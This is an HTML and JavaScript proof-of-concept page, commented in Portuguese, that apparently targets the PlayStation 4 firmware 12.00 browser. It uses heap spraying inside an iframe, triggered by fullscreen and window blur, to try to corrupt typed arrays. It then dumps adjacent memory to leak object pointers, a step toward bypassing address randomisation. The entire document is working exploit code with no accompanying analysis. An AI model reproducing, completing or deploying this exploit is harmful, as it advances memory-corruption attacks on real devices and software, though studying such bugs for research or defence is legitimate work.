<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 12.00 - Shadow Spray (Interleaved)</title>
    <style>
        body { background-color: #1a1a1a; color: #fff; font-family: monospace; padding: 20px; }
        button { padding: 12px; font-weight: bold; cursor: pointer; margin-right: 10px; border-radius: 5px; }
        #log-area { background: #000; color: #0f0; padding: 15px; border: 1px solid #444; height: 400px; overflow-y: scroll; display: none; margin-top: 20px;}
        .highlight { color: #fff; background-color: #d32f2f; padding: 2px; }
    </style>
</head>
<body>

    <h2>PS4 12.00 - Shadow Pointer Spray</h2>
    <p>Status: <span id="status" style="color: #ffeb3b;">Aguardando...</span></p>

    <button onclick="prepareMemory()" style="background: #e0e0e0; color: #000;">1. Preparar Pai (Janela de 32)</button>
    <button onclick="injectTrigger()" style="background: #e0e0e0; color: #000;">2. Injetar Gatilho (Spray Paralelo)</button>
    <button onclick="verifyLeak()" style="background: #4caf50; color: #fff;">3. Memory Dump</button>

    <div id="log-area"></div>
    <div id="frame-container" style="margin-top: 20px;"></div>

    <script>
        const PATTERN = 2.121995791e-314; 
        let controllers = [];
        const statusEl = document.getElementById('status');
        const logArea = document.getElementById('log-area');

        function prepareMemory() {
            controllers = [];
            for(let i = 0; i < 5000; i++) {
                // Aumentamos a janela para 32 (256 bytes) para conseguir "enxergar" os vizinhos
                let arr = new Float64Array(32);
                arr[0] = i;
                controllers.push(arr);
            }
            statusEl.innerText = "5000 Objetos Prontos (Visão estendida para 32).";
        }

        function injectTrigger() {
            const container = document.getElementById('frame-container');
            container.innerHTML = '<iframe id="pocFrame" style="width:100%; height:150px; border:2px dashed red;"></iframe>';
            const fDoc = document.getElementById('pocFrame').contentWindow.document;

            fDoc.open();
            fDoc.write(`
                <html><body style="background:#fff; text-align:center;">
                    <button onclick="startPoC()" style="padding:15px; background:#f44336; color:#fff; font-weight:bold;">START FS + OPTIONS</button>
                    <script>
                        function startPoC() {
                            document.documentElement.webkitRequestFullscreen();
                            
                            window.onblur = function() {
                                let spray = [];
                                let shadow_spray = []; // O Spray Paralelo
                                
                                for (let i = 0; i < 8000; i++) {
                                    // 1. A MUNIÇÃO ORIGINAL (Mantém a corrupção e a tela azul)
                                    spray.push(new Float64Array(10).fill(${PATTERN}));
                                    
                                    // 2. A SOMBRA (Aloca ponteiros paralelamente)
                                    // Arrays preenchidos com objetos alocam 'Butterflies' na mesma região dos buffers!
                                    shadow_spray.push([document, window, navigator, document, window, navigator]);
                                }

                                // O seu timing original
                                setTimeout(() => {
                                    document.open();
                                    document.write('<h2 style="color:green;">FINALIZADO</h2>');
                                    document.close();
                                }, 1000);
                            };
                        }
                    <\/script>
                </body></html>
            `);
            fDoc.close();
            statusEl.innerText = "Iframe Pronto. Sequência original: FS -> OPTIONS.";
        }

        function verifyLeak() {
            let corrupted = null;
            let corruptedIndex = -1;

            for(let i = 0; i < controllers.length; i++) {
                // Procuramos exatamente pelo seu padrão de sucesso
                if (controllers[i][0] === PATTERN) { 
                    corrupted = controllers[i];
                    corruptedIndex = i;
                    break;
                }
            }

            logArea.style.display = "block";
            logArea.innerHTML = "<b>[ DEEP MEMORY DUMP - 32 OFFSETS ]</b><br><br>";

            if (corrupted) {
                statusEl.innerHTML = "<span style='color:#4caf50;'>✓ BINGO! ID Corrompido: " + corruptedIndex + "</span>";
                logArea.innerHTML += "Vazamento estabelecido. Procurando ponteiros na zona de Sombra...<br><br>";
                
                let foundPointer = false;

                for(let i = 0; i < 32; i++) {
                    const val = corrupted[i];
                    const buf = new ArrayBuffer(8);
                    new Float64Array(buf)[0] = val;
                    const hexStr = new BigUint64Array(buf)[0].toString(16).padStart(16, '0');
                    
                    let label = "";
                    let isPtr = false;

                    // O seu spray original preenche os primeiros 10 offsets (0 ao 9)
                    if (hexStr.includes("41414141")) {
                        label = " (Padrão Original)";
                    } 
                    // Do offset 10 em diante, estamos lendo a memória além do spray!
                    else if (hexStr !== "0000000000000000") {
                        label = " (PONTEIRO VAZADO!)";
                        isPtr = true;
                        foundPointer = true;
                    } else {
                        label = " (Zero Fill)";
                    }
                    
                    let css = isPtr ? "class='highlight'" : "";
                    logArea.innerHTML += "Offset [" + String(i).padStart(2, '0') + "]: <span " + css + ">0x" + hexStr + "</span>" + label + "<br>";
                }

                if(foundPointer) {
                    logArea.innerHTML += "<br><b style='color:yellow;'>Você invadiu a região sombra e capturou endereços!</b>";
                }
            } else {
                statusEl.innerHTML = "<span style='color:#f44336;'>✗ FALHA: Corrupção não detectada.</span>";
                logArea.innerHTML += "Nenhum overlap desta vez. Feche a aba para limpar o GC e tente novamente.";
            }
        }
    </script>
</body>
</html>
